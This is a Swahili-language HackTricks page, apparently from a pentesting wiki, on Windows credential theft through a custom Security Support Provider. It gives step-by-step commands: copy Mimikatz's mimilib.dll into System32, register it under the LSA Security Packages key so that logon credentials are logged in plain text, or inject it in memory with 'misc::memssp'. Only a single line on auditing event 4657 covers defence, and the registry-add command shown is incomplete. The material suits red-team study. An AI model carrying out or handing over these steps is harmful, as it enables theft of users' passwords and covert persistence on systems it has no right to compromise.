# SSP ya Kibinafsi

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

### SSP ya Kibinafsi

[Jifunze ni nini SSP (Mtoa Msaada wa Usalama) hapa.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kupata** kwa **maandishi wazi** **vyeti** vinavyotumiwa kupata mashine.

#### Mimilib

Unaweza kutumia `mimilib.dll` binary iliyotolewa na Mimikatz. **Hii itaandika kwenye faili vyeti vyote kwa maandishi wazi.**\
Weka dll kwenye `C:\Windows\System32\`\
Pata orodha ya Pakiti za Usalama za LSA zilizopo:

{% code title="mshambuliaji@lengo" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Ongeza `mimilib.dll` kwenye orodha ya Mtoaji wa Usaidizi wa Usalama (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Na baada ya kuanza upya, vyeti vyote vinaweza kupatikana kwa maandishi wazi kwenye `C:\Windows\System32\kiwissp.log`

#### Kumbukumbu

Unaweza pia kuiingiza hii kumbukumbu moja kwa moja kwa kutumia Mimikatz (tambua kwamba inaweza kuwa kidogo isiyo imara/isiyofanya kazi):
```powershell
privilege::debug
misc::memssp
```
Hii haitaishi baada ya kuzimwa upya.

#### Kupunguza Hatari

Tukio la Kitambulisho 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
